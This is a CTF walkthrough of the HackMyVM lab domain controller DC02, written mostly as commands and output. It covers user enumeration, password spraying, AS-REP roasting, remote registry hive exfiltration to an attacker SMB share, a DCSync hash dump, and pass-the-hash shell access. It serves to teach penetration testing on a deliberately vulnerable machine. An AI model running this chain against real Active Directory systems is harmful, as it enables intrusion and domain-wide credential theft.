---
title: CTF Walkthrough for HackMyVM Machine DC02
date: 2024-10-18 00:00:00 +0300
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, Kerberoasting,ASREPRoasting, Pass the Hash attack, DCSync attack]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-10-18-dc02/box-dc02.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about DC02 a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Literal<br>
Goal: Get two flags<br>
OS: Windows<br>
Download link: [DC02](https://downloads.hackmyvm.eu/dc02.zip)<br>
### Tools used
1) fping<br>
2) Nmap<br>
3) CrackMapExec<br>
4) SMBMap<br>
5) Impacket tools<br>
6) Hashcat<br>
7) Bloodhound<br>

## Reconnaissance

First of all, we need to identify our target on the network. We do this by performing a host discovery scan on the current subnet.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC02/Scans]
└─$ fping -aqg 10.0.2.16/24                               
<SNIP>
10.0.2.16
10.0.2.32
```

After we have obtained the IP address of our target, we can perform a service scan to identify running services on the target.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC02/Scans/Service]
└─$ nmap -n -Pn -sC -sV 10.0.2.32 -oN service-scan.nmap     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 20:14 BST
Nmap scan report for 10.0.2.32
Host is up (0.00099s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-13 05:14:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:49:99:a0 (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2024-10-13T05:14:42
|_  start_date: N/A
|_clock-skew: 9h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.06 seconds
```

We can see that the target runs a Kerberos, a DNS, and an LDAP server that is typic to a Windows domain controller. The scan result reveals the domain name of the target, we can add this domain to our `/etc/hosts` file.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC02/Scans/Service]
└─$ echo "10.0.2.32\tSOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL" | sudo tee -a /etc/hosts
10.0.2.32       SOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL
```

The target doesn't have an SMB null session nor LDAP anonymous log in enabled. We can use a wordlist containing common usernames to enumerate possible usernames in the domain by leveraging Kerberos authentication.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC02/Scans/AD Enumeration]
└─$ kerbrute userenum -d SOUPEDECODE.LOCAL -t 50 --dc DC01.SOUPEDECODE.LOCAL  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_user.txt
<SNIP>

2024/10/13 09:11:27 >  Using KDC(s):
2024/10/13 09:11:27 >   DC01.SOUPEDECODE.LOCAL:88

2024/10/13 09:11:27 >  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL
2024/10/13 09:11:27 >  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL
2024/10/13 09:11:27 >  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL
2024/10/13 09:11:27 >  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL
2024/10/13 09:11:27 >  [+] VALID USERNAME:       Admin@SOUPEDECODE.LOCAL
2024/10/13 09:11:30 >  [+] VALID USERNAME:       Administrator@SOUPEDECODE.LOCAL
2024/10/13 09:11:30 >  [+] VALID USERNAME:       CHARLIE@SOUPEDECODE.LOCAL
2024/10/13 09:11:39 >  [+] VALID USERNAME:       ADMIN@SOUPEDECODE.LOCAL
2024/10/13 09:13:36 >  [+] VALID USERNAME:       wreed11@SOUPEDECODE.LOCAL
2024/10/13 09:18:13 >  [+] VALID USERNAME:       printserver@SOUPEDECODE.LOCAL
2024/10/13 09:22:50 >  [+] VALID USERNAME:       kleo2@SOUPEDECODE.LOCAL    
2024/10/13 09:27:41 >  [+] VALID USERNAME:       dc01@SOUPEDECODE.LOCAL
2024/10/13 09:30:52 >  [+] VALID USERNAME:       aDmin@SOUPEDECODE.LOCAL
2024/10/13 09:32:40 >  [+] VALID USERNAME:       ChArLiE@SOUPEDECODE.LOCAL
2024/10/13 09:32:42 >  [+] VALID USERNAME:       CHarlie@SOUPEDECODE.LOCAL    
2024/10/13 09:33:30 >  Done! Tested 8295455 usernames (15 valid) in 1323.122 seconds

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC02/Scans/AD Enumeration]
└─$ cat valid_user.txt | grep @  | cut -d " " -f8 | cut -d '@' -f1 | while read a; do echo ${a,,} >> valid_user_lowercase.txt;done 

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC02/Scans/AD Enumeration]
└─$ cat valid_user_lowercase.txt  | sort -u > valid_usernames.txt
```

## Exploitation

Users often tend to use their usernames as their passwords so let's try to perform a password spray attack with the username wordlist we enumerated above.  
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC02/Scans/AD Enumeration]
└─$ crackmapexec smb DC01.SOUPEDECODE.LOCAL -u valid_usernames.txt -p valid_usernames.txt --no-bruteforce --continue-on-success
SMB         SOUPEDECODE.LOCAL 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\admin:admin STATUS_LOGON_FAILURE 
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\administrator:administrator STATUS_LOGON_FAILURE 
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\<REDACTED>:<REDACTED> 
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\dc01:dc01 STATUS_LOGON_FAILURE 
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS_LOGON_FAILURE 
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\printserver:printserver STATUS_LOGON_FAILURE 
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE 
```

We obtained a hit on a user. We can use this user to dump all domain users on the target. 
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC02/Scans/AD Enumeration]
└─$ crackmapexec smb DC01.SOUPEDECODE.LOCAL -u valid_usernames.txt -p valid_usernames.txt --no-bruteforce --continue-on-success
SMB         SOUPEDECODE.LOCAL 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\admin:admin STATUS_LOGON_FAILURE 
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\administrator:administrator STATUS_LOGON_FAILURE 
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\<REDACTED>:<REDACTED> 
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\dc01:dc01 STATUS_LOGON_FAILURE 
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS_LOGON_FAILURE 
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\printserver:printserver STATUS_LOGON_FAILURE 
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE

┌──(pentester㉿kali)-[~/…/HackMyVM/DC02/Scans/AD Enumeration]
└─$ cat all_users.txt| grep  'SOUPEDECODE.LOCAL\\' | cut -d '\' -f2 | cut -d ' ' -f1 | grep -v charlie:charlie > domain_users.txt

┌──(pentester㉿kali)-[~/…/HackMyVM/DC02/Scans/AD Enumeration]
└─$ wc -l domain_users.txt                                                                                        
964 domain_users.txt 
```

Now that we have a list of all usernames in the domain, we can use it to enumerate and request the ticket-granting ticket for any user with Kerberos pre-authentication disabled.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC02/Scans/AD Enumeration]
└─$ impacket-GetNPUsers  SOUPEDECODE.LOCAL/ -dc-ip 10.0.2.32 -no-pass -usersfile domain_users.txt | grep -v  '[-]'

$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:8616d1dbb1d6e76628f5969bcff763d0$a5e912d2acd9567b7620ee0572792f345f6a647dcbddcb0d69b707ccc0ed7cd28aadd0fa996fdd644cf733b67d9bc4b3949af5e68515939f56fd2cec0ca78c81fcc7ca5442159847c5e1062c04eff9e8299ba29e760e304faa8ed3b0e87027f2bb57a5f54284ad5232c27f215e1ef1dc9587183999ecc5acfa4c2ec953eb61a3ca6448c6aa22bdf66b5abea516548350397a8db21010096fbdddf85c961195f7d3531da0c87fd9d3dd586366b1766bc20f429b354406b574bb7261a89ec14d6ecb7fd7ed96e8e2fdd379fb049f1affd3481dae8ac0362a73b217b8b3bb9e46e5ab7fd6d25fa99521c4b23f8fd0cfbf762df26d395493
```

We could retrieve the TGT of the user zximena448. We can crack the hash used to encrypt this TGT using Hashcat.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC02/Misc Files]
└─$hashcat -a 0 -m 18200 user.tgt /usr/share/wordlists/rockyou.txt
<SNIP>
$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:8616d1dbb1d6e76628f5969bcff763d0$a5e912d2acd9567b7620ee0572792f345f6a647dcbddcb0d69b707ccc0ed7cd28aadd0fa996fdd644cf733b67d9bc4b3949af5e68515939f56fd2cec0ca78c81fcc7ca5442159847c5e1062c04eff9e8299ba29e760e304faa8ed3b0e87027f2bb57a5f54284ad5232c27f215e1ef1dc9587183999ecc5acfa4c2ec953eb61a3ca6448c6aa22bdf66b5abea516548350397a8db21010096fbdddf85c961195f7d3531da0c87fd9d3dd586366b1766bc20f429b354406b574bb7261a89ec14d6ecb7fd7ed96e8e2fdd379fb049f1affd3481dae8ac0362a73b217b8b3bb9e46e5ab7fd6d25fa99521c4b23f8fd0cfbf762df26d395493:<REDACTED>
                                                          
<SNIP>
Hardware.Mon.#1..: Temp: 75c Util: 31%

Started: Sun Oct 13 16:00:18 2024
Stopped: Sun Oct 13 16:00:43 2024
```

## Post Exploitation

Now that we have gathered all the credentials we could from  a blind perspective, let's run the Bloodhound tool from our attack host. We can do this by setting up a fake DNS server using `dnschef` and running Bloodhound by giving it the IP address of our fake DNS server for name resolution.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC02/dnschef]
└─$ dnschef --fakeip 10.0.2.32
          _                _          __  
         | | version 0.4  | |        / _| 
       __| |_ __  ___  ___| |__   ___| |_ 
      / _` | '_ \/ __|/ __| '_ \ / _ \  _|
     | (_| | | | \__ \ (__| | | |  __/ |  
      \__,_|_| |_|___/\___|_| |_|\___|_|  
                   iphelix@thesprawl.org  

(14:49:39) [*] DNSChef started on interface: 127.0.0.1
(14:49:39) [*] Using the following nameservers: 8.8.8.8
(14:49:39) [*] Cooking all A replies to point to 10.0.2.32
```
```bash
┌──(pentester㉿kali)-[~/…/Scans/AD Enumeration/Bloodhound/BloodHound.py]
└─$ bloodhound-python  -u zximena448 -p <REDACTED> -ns 127.0.0.1 -d SOUPEDECODE.LOCAL  -dc DC01.SOUPEDECODE.LOCAL   --zip
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.SOUPEDECODE.LOCAL
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest                        
INFO: Found 101 computers
INFO: Found 965 users                                      
INFO: Connecting to LDAP server: DC01.SOUPEDECODE.LOCAL
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 52 groups                                      
INFO: Found 0 trusts
INFO: Starting computer enumeration wi
<SNIP>
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
WARNING: Failed to get service ticket for DC01.SOUPEDECODE.LOCAL, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in 00M 33S
┌──(pentester㉿kali)-[~/…/DC02/Scans/AD Enumeration/Bloodhound]
└─$ ls
20241013145714_bloodhound.zip
```

We can start the Neo4j, open the Bloodhound GUI application, and import the domain data zip file we enumerated above.
```bash
┌──(pentester㉿kali)-[~/…/DC02/Scans/AD Enumeration/Bloodhound]
└─$ sudo neo4j  start                                                            <SNIP>
Starting Neo4j.          
Started neo4j (pid:94204). It is available at http://localhost:7474
There may be a short delay until the server is ready.

┌──(pentester㉿kali)-[~/…/DC02/Scans/AD Enumeration/Bloodhound]
└─$ bloodhound&
[1] 96315
```

Now that we have imported the data, we can research the user zximena448 and enumerate its privileges, group membership, and others.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-18-dc02/capture-1.png)
![](/assets/img/posts/walthrough/hackmyvm/2024-10-18-dc02/capture-2.png)

We can see that the user zximena448 is a member of the backup operator group. This group can backup the SAM database where credentials are stored. Since this user can't log into the DC01, we will back up this database remotely using Impacket tools. We first need to start an SMB server where the backup will be uploaded from the target to our attack host.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC02/Misc File]
└─$ impacket-smbserver -smb2support share . &
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

After the SMB server is set, we can remotely back up the registry keys using `impacket-reg` tool.
```bash
┌──(pentester㉿kali)-[~/…/DC02/Scans/AD Enumeration/Bloodhound]
└─$ impacket-reg -dc-ip 10.0.2.32 SOUPEDECODE.LOCAL/zximena448:internet@10.0.2.32  backup -o '\\10.0.2.16\share'                                                                            
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to \\10.0.2.16\share\SAM.save  
[*] Saved HKLM\SYSTEM to \\10.0.2.16\share\SYSTEM.save         
[*] Saved HKLM\SECURITY to \\10.0.2.16\share\SECURITY.save
```

These backups will be uploaded to the SMB server we set up  earlier as we specify in the command. We can now dump the content of these backups using `impacket-secretsdump`.

```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC02/Misc File]
└─$ impacket-secretsdump -sam SAM.save  -system SYSTEM.save -security SECURITY.save LOCAL 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:92737daf8b0c620cb11e6213ff29e2fa1c69d7e7286527db7fa45d18086e744af77521ffb4aa4d79a1d1fad0315cdfa798e4e308239d2ad3a85bfb8db8f8061721841a31e6baab96ce038a74b28a13a00e0e8dc180780720b32f1600760304037995d963a5cf80fd5c48e170464e06e66e3e54b056e4aba1e76ac1ea93279d351010a43ef39222662c451171d0420989821b6129e0cc29ae256c9aa991413d78c0837646f1fd3cfb07da60dc3840a999c311de7646638510c784b99729eda82d5fefa3a49f3bde9f66b2dad0661b2d5904d90cf934411aefaca46b5db4cda04745217b3f9bf58e0070eb2c8f63782bee
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:<REDACTED>
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4
dpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503
[*] NL$KM 
 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...
 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU>...!.
 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.
 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...
NL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991
[*] Cleaning up... 
```

The SAM backup contains an administrator NTLM hash but we can't log in using this hash.
```bash
┌──(pentester㉿kali)-[~/…/DC02/Scans/AD Enumeration/Bloodhound]
└─$ crackmapexec smb DC01.SOUPEDECODE.LOCAL -u Administrator -H 209c6174da490caeb422f3fa5a7ae634  
SMB         SOUPEDECODE.LOCAL 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:209c6174da490caeb422f3fa5a7ae634 STATUS_LOGON_FAILURE
```

We can also notice the hash of a machine account i.e. $MACHINE.ACC. We can perform a password spray of this hash to all machine accounts in the active directory environment. We first need a word list of all machine accounts on the target. We can get this using the `xxxxxxxxxx_computers.json` file from Bloodhound's enumeration.
```bash
┌──(pentester㉿kali)-[~/…/DC02/Scans/AD Enumeration/Bloodhound]
└─$ unzip 20241013145714_bloodhound.zip
Archive:  20241013145714_bloodhound.zip
 extracting: 20241013145714_groups.json  
 extracting: 20241013145714_domains.json  
 extracting: 20241013145714_computers.json  
 extracting: 20241013145714_users.json  

┌──(pentester㉿kali)-[~/…/DC02/Scans/AD Enumeration/Bloodhound]
└─$ cat 20241013145714_computers.json | jq .  | grep samaccountname | cut -d '"' -f4 > machines.txt
```

After creating the wordlist of machine accounts in the domain, we can start the password spray attack using `CrackMapExec`.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC02/Scans/AD Enumeration]
└─$ crackmapexec smb DC01.SOUPEDECODE.LOCAL -u Bloodhound/machines.txt  -H <REDACTED> | grep -v '[-]'
SMB                      SOUPEDECODE.LOCAL 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB                      SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\DC01$:<REDACTED> 
```

We get a hit on the machine account DC01$. We can use Bloodhound to enumerate the privileges of this account.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-18-dc02/capture-3.png)

We can see that this machine account is a member of the Administrator group. We can use this group membership privilege to perform a DCSync attack against the domain controller.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC02/Scans/AD Enumeration]
└─$ crackmapexec smb DC01.SOUPEDECODE.LOCAL -u 'DC01$' -H c03669288f2d84068ff17d69058f505d --ntds  
SMB         SOUPEDECODE.LOCAL 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\DC01$:c03669288f2d84068ff17d69058f505d 
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         SOUPEDECODE.LOCAL 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::
SMB         SOUPEDECODE.LOCAL 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         SOUPEDECODE.LOCAL 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
SMB         SOUPEDECODE.LOCAL 445    DC01             soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::
SMB         SOUPEDECODE.LOCAL 445    DC01             soupedecode.local\otara1:1104:aad3b435b51404eeaad3b435b51404ee:ee98f16e3d56881411fbd2a67a5494c6:::
<SNIP>
SMB         SOUPEDECODE.LOCAL 445    DC01             PC-89$:2161:aad3b435b51404eeaad3b435b51404ee:288283bc94f0b34b3b880d1b910d595c:::
SMB         SOUPEDECODE.LOCAL 445    DC01             PC-90$:2162:aad3b435b51404eeaad3b435b51404ee:4ec3542687ebf86562bad0c5a78b4b60:::
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] Dumped 1065 NTDS hashes to /home/pentester/.cme/logs/DC01_SOUPEDECODE.LOCAL_2024-10-13_160255.ntds of which 964 were added to the database
```

We have dumped the credentials of all the users in the domain. We can use the administrator's hash to log into the domain controller locally using WinRm and read both flags on the target.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC02/Scans/AD Enumeration]
└─$ crackmapexec smb DC01.SOUPEDECODE.LOCAL -u Administrator -H 8982babd4da89d33210779a6c5b078bd 
SMB         SOUPEDECODE.LOCAL 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\Administrator:8982babd4da89d33210779a6c5b078bd (Pwn3d!)

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC02]
└─$ evil-winrm -i 10.0.2.32 -u Administrator -H 8982babd4da89d33210779a6c5b078bd                 
Evil-WinRM shell v3.5

<SNIP>
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>cd ..
*Evil-WinRM* PS C:\Users\Administrator> ls Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/12/2024   1:01 PM             33 root.txt
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/15/2024  12:56 PM                Administrator
d-r---         6/15/2024  10:54 AM                Public
d-----         6/17/2024  11:30 AM                zximena448


*Evil-WinRM* PS C:\Users> dir zximena448\Desktop


    Directory: C:\Users\zximena448\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/12/2024   1:01 PM             33 user.txt

```

## Conclusion

Congratulations! In this walkthrough, you leveraged a succession of weak passwords to compromise different accounts on the system that gave you administrator access. This machine was designed to show how the use of weak passwords could seriously affect the security posture of an organisation. Thank you for following up on this walkthrough.
